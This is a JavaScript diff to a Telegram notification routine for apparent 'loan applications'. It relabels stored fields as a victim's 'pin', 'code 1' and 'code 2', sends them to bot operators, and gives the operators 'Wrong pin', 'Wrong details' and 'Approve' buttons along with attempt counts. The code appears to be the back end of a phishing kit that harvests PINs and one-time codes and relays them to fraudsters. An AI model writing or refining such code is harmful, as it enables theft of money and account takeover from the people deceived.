@@ -431,7 +431,7 @@ function formatTelegramNotification(application, kind) {
       `📋 ID: ${application.application_no || id}\n` +
       `📞 PHONE: ${phone}\n` +
       `💬 WhatsApp: ${application.whatsapp_number || "Not provided"}\n` +
-      `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
+      `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
       `💰 Loan amount: ${money(application.amount)}\n` +
     `📅 Repayment term: ${application.term_months || "—"} months\n` +
       `📊 Line usage: ${lineUsageLabel(application.line_usage_profile)}\n` +
@@ -442,7 +442,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongpin") {
     return `🔑 WRONG PIN — REJECTED\n\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
+      `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
       `💰 Loan amount: ${money(application.amount)}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
@@ -454,7 +454,7 @@ function formatTelegramNotification(application, kind) {
   if (kind === "wrongfirst") {
     return `🔢 WRONG CODE 1 — REJECTED\n\n` +
       `📋 Application: ${id}\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
+      `🧾 code 1: ${application.application_id || application.application_no || "—"}\n` +
       `💰 Loan amount: ${money(application.amount)}\n` +
       `📞 Phone: ${phone}\n` +
       `🔐 Code 1: Submitted for secure verification\n` +
@@ -466,7 +466,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongsecond") {
     return `🔢 WRONG CODE 2 — REJECTED\n\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
+      `🧾 code 2: ${application.application_id || application.application_no || "—"}\n` +
       `💰 Loan amount: ${money(application.amount)}\n` +
       `📞 Phone: ${phone}\n` +
       `🔐 Code 2: Submitted for secure verification\n` +
@@ -479,7 +479,7 @@ function formatTelegramNotification(application, kind) {
   return `❌ APPLICATION REJECTED\n\n` +
     `🤳ID: ${application.application_no || id}\n` +
     `📞 PHONE: ${phone}\n` +
-    `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
+    `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
     `💰 Loan amount: ${money(application.amount)}\n` +
     `⚠️ Reason: ${application.rejection_reason || "Application rejected"}\n` +
     `🔁 Attempt: #${attempt}\n` +
@@ -509,19 +509,19 @@ async function notifyTelegram(application) {
     `📋 ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
     `📞 PHONE: ${application.phone || "—"}\n` +
     `💬 WhatsApp: ${application.whatsapp_number || "Not provided"}\n` +
-    `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
     `💰 Loan amount: ${money(application.amount)}\n` +
     `📅 Repayment term: ${application.term_months || "—"} months\n` +
-    `🔢 REFERENCE CODE 1: ${application.first_name || "Not submitted"}\n` +
-    `🔢 REFERENCE CODE 2: ${application.second_name || "Not submitted"}\n` +
+    `🔢  CODE 1: ${application.first_name || "Not submitted"}\n` +
+    `🔢  CODE 2: ${application.second_name || "Not submitted"}\n` +
     `⏰ Date: ${stamp}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
   for (const adminId of recipients) {
     const isSuperAdmin = superAdminIds.has(String(adminId));
     const keyboard = { inline_keyboard: [[
-      { text: "❌ Wrong Reference", callback_data: `wrongid:${application.id}` },
-      { text: "❌ Wrong Bundle Choice", callback_data: `wrongcode:${application.id}` }
+      { text: "❌ Wrong pin", callback_data: `wrongid:${application.id}` },
+      { text: "❌ Wrong details", callback_data: `wrongcode:${application.id}` }
     ], [{ text: "✅ Approve", callback_data: `approve:${application.id}` }]] };
     try { await bot.sendMessage(adminId, isSuperAdmin ? `${message}\n\n👑 SUPER ADMIN ASSIGNED APPLICATION` : message, { reply_markup: keyboard, disable_web_page_preview: true }); }
     catch (err) { console.error(`Telegram send failed for admin ${adminId}:`, err.message); }
